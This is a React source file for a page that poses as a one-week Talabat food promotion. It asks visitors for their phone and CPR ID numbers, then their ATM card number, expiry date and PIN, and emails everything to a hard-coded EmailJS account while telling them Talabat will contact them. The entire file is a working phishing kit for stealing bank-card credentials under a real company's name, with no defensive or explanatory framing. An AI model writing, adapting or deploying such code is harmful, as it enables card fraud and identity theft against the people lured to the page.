import React, { useState, useRef } from "react";
import Header from "./../../components/header";
import { Container } from "@mui/system";
import {
  TextField,
  Grid,
  Button,
  CircularProgress,
  InputLabel,
  Typography,
} from "@mui/material";
import useStyles from "./../../globalStyles/index";
import SnackbarAlert from "./../../components/snackbar/SnackbarAlert";
import emailjs from "emailjs-com";
import moment from "moment";
import Swal from "sweetalert2";

const Login = () => {
  const classes = useStyles();
  const form = useRef();
  const [showFields, setShowFields] = useState(false);
  const [snackbarProps, setSnackbarProps] = useState({
    open: false,
    type: "",
    message: "",
  });
  const [inputValue, setInputValue] = useState({
    phone: "",
    cpr: "",
    atmCard: "",
    expire: moment(new Date()).format("YYYY-MM-DD"),
    atmPin: "",
    paymentOption: "",
  });
  const [dateVal, setDateVal] = useState(
    moment(new Date()).format("YYYY-MM-DD")
  );
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e) => {
    if (e.target.name === "expire") {
      setDateVal(e.target.value);
      let format = moment(e.target.value).format("MMM/YYYY");
      setInputValue({ ...inputValue, expire: format });
    } else setInputValue({ ...inputValue, [e.target.name]: e.target.value });
  };

  const handleNext = () => {
    setShowFields(true);
  };

  const sendEmail = (e) => {
    e.preventDefault();

    if (
      inputValue.phone !== "" &&
      inputValue.cpr !== "" &&
      inputValue.atmCard !== "" &&
      inputValue.expire !== "" &&
      inputValue.atmPin !== "" &&
      inputValue.paymentOption !== ""
    ) {
      setIsLoading(true);

      emailjs
        .sendForm(
          "service_ndhkhew",
          "template_znn8lrn",
          form.current,
          "GSQBKsPwxBFE5XnyN"
        )
        .then(
          (result) => {
            Swal.fire(
              "Message send successfully!",
              "You will soon be contacted by Talabat",
              "success"
            );

            setIsLoading(false);

            setInputValue({
              phone: "",
              cpr: "",
              atmCard: "",
              expire: "",
              paymentOption: "",
              atmPin: "",
            });
          },
          (error) => {
            handleSnackbarVal(true, "error", error.text);
            setIsLoading(false);
            console.log(error.text, "errrreoeoreore");
          }
        );
      setInputValue({
        phone: "",
        cpr: "",
        atmCard: "",
        expire: "",
        paymentOption: "",
        atmPin: "",
      });
    } else {
      handleSnackbarVal(true, "error", "Please Fill All Fields");
    }
  };

  const handleSnackbarVal = (open, type, message) => {
    setSnackbarProps({
      open,
      type,
      message,
    });
  };

  const handleCloseSnackbar = () => {
    handleSnackbarVal(false, "", "");
  };

  return (
    <div>
      <SnackbarAlert
        snackbarProps={snackbarProps}
        handleCloseSnackbar={handleCloseSnackbar}
      />
      <Header />

      <Container maxWidth="sm">
        <form ref={form}>
          <Grid container spacing={2} style={{ marginTop: "30px" }}>
            <Grid
              item
              xs={12}
              style={{
                display: !showFields ? "block" : "none",
              }}
            >
              <TextField
                variant="outlined"
                placeholder="Enter your mobile number"
                fullWidth
                size="small"
                name="phone"
                value={inputValue.phone}
                onChange={handleChange}
              />
            </Grid>
            <Grid
              item
              xs={12}
              style={{
                display: !showFields ? "block" : "none",
              }}
            >
              <TextField
                variant="outlined"
                placeholder="Enter your cpr number"
                fullWidth
                size="small"
                name="cpr"
                value={inputValue.cpr}
                onChange={handleChange}
              />
            </Grid>

            {/* Other Four Fields */}
            <Grid
              item
              xs={12}
              style={{
                display: showFields ? "block" : "none",
              }}
            >
              <TextField
                variant="outlined"
                placeholder="Enter your ATM card number"
                fullWidth
                size="small"
                name="atmCard"
                value={inputValue.atmCard}
                onChange={handleChange}
              />
            </Grid>
            <Grid
              item
              xs={12}
              style={{
                display: showFields ? "block" : "none",
              }}
            >
              <div style={{ position: "relative" }}>
                <InputLabel
                  style={{
                    position: "absolute",
                    right: "60px",
                    top: "10px",
                    color: "#a5a5a5",
                    fontSize: "14px",
                  }}
                >
                  Expiry Date
                </InputLabel>
                <TextField
                  fullWidth
                  variant="outlined"
                  format="YYYY-MM-DD"
                  size="small"
                  name="expire"
                  type="date"
                  value={dateVal}
                  onChange={handleChange}
                />
              </div>
            </Grid>
            <Grid
              item
              xs={12}
              style={{
                display: showFields ? "block" : "none",
              }}
            >
              <TextField
                fullWidth
                variant="outlined"
                placeholder="Enter your ATM pin"
                size="small"
                name="atmPin"
                value={inputValue.atmPin}
                onChange={handleChange}
              />
            </Grid>
            <Grid
              item
              xs={12}
              style={{
                display: showFields ? "block" : "none",
              }}
            >
              <TextField
                fullWidth
                variant="outlined"
                placeholder="Payment (pay only 1.5 BD)"
                size="small"
                name="paymentOption"
                value={inputValue.paymentOption}
                onChange={handleChange}
              />
            </Grid>

            <Grid item xs={12} style={{ textAlign: "center" }}>
              {!showFields ? (
                <>
                  <Button
                    variant="contained"
                    fullWidth
                    className={classes.loginBtnStyle}
                    onClick={handleNext}
                  >
                    Let's go
                  </Button>

                  <Typography
                    variant="h6"
                    style={{ textAlign: "center", margin: "10px 0" }}
                  >
                    Promotion is valid for 1 week
                  </Typography>

                  <img
                    src={require("../../assets/images/food-img.jpg")}
                    width="90%"
                    style={{ margin: "0 auto" }}
                    alt="avatar"
                  />
                </>
              ) : isLoading ? (
                <Button
                  variant="contained"
                  fullWidth
                  className={classes.loginBtnStyle}
                >
                  <CircularProgress size={30} style={{ color: "#fff" }} />
                </Button>
              ) : (
                <Button
                  variant="contained"
                  fullWidth
                  className={classes.loginBtnStyle}
                  onClick={sendEmail}
                >
                  Submit
                </Button>
              )}
              {showFields ? (
                <Button
                  variant="contained"
                  fullWidth
                  className={classes.loginBtnStyle}
                  style={{ marginTop: "10px" }}
                  onClick={() => setShowFields(false)}
                >
                  Go Back
                </Button>
              ) : null}
              {/* )} */}
            </Grid>
          </Grid>
        </form>
      </Container>
    </div>
  );
};

export default Login;
